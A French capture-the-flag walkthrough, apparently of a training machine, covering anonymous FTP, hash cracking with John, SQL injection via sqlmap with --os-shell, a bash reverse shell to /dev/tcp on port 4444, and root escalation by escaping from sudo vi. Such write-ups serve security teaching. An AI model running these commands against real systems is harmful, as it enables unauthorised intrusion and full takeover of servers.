
# Découverte
Avec nmap, on observe 3 ports ouverts :
- 21 : ftp
- 22 : ssh
- 80 : http

On peut accéder au ftp avec l'utilisateur "anonymous" et on récupère le fichier "backup.zip".
Le fichier est protégé par un mot de passe.
On utilise John pour le casser :
```bash
zip2john backup.zip > backup_pwd_hash.txt
john backup_pwd_hash.txt 
```

On décompresse le zip et on récupère le code source du site web qui est présent sur le port 80. Dans ce code php, il y a le hash md5 du mot de passe admin codé en dur.
On utilise à nouveau John pour le casser.

# Site internet
On a accès au site web présent sur le port 80 et on peut passer l'authentification avec les identifiants trouvés précédemment.

Le site web affiche un tableau avec un liste de voiture, et il y a une fonction de recherche.
Cette fonction de recherche est vulnérable aux injections SQL et le site nous  renvoie l'erreur de la base de données quand une requête est fausse.

D'après l'erreur, la commande est :
```SQL
Select * from cars where name ilike '%<input>%'
```

On va utiliser SQLmap pour exploiter ce point d'entrée qui est le paramètre 'search' :
```bash
sqlmap -u 'http://10.129.173.159/dashboard.php?search=test' -p 'search' --cookie 'PHPSESSID=ksff4fp3a4p3lhc06o6pq83ptv' --os-shell
```
*Note* : attention à ne pas oublier le cookie dans la requête.
On obtient alors un shell !

# Shell
On a un shell sur le serveur, mais on est l'utilisateur "postgres".
En se promenant sur le répertoire de postgres on trouve le flag de l'utilisateur.

## Amélioration du shell
Comme le shell de sqlmap n'est pas très stable, on décide de créer un reverse shell depuis notre shell sur sql en exécutant la commande suivante :
```bash
bash -c "/bin/bash -i >& /dev/tcp/10.10.15.35/4444 0>&1"
```

Exemple de commande pour reverse shell : https://www.revshells.com/


## Escalade de privilèges
On est connecté en tant que postgres mais on ne connait pas le mot de passe de cet utilisateur et on ne peut donc pas utiliser la commande sudo.
On trouve le code source de l'application dans le dossier `/var/www/html` et en regardant le code source, on trouve le mot de passe de l'utilisateur postgres écrit en clair.
On peut alors se connecter en ssh, ce qui est plus simple.

On essaie de voir si l'utilisateur postgres peut utiliser la commande `sudo -l`, on obtient alors l'output :
```
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Donc, la seule commande utilisable en sudo (et donc avec les privilèges root) est : `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`

Ce site référence de nombreuses façon d'élever ces privilèges : https://gtfobins.github.io/
En particulier, en cherchant `vi`, on se rend compte que `vi` possède une fonctionnalité avancée qui est d'ouvrir un shell depuis l'éditeur vi.
Donc :
1. `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`
2. Depuis l'éditeur vi : `:shell`
3. Un shell en tant que root apparaît !

On trouve ensuite le flag dans le dossier home de l'utilisateur root.


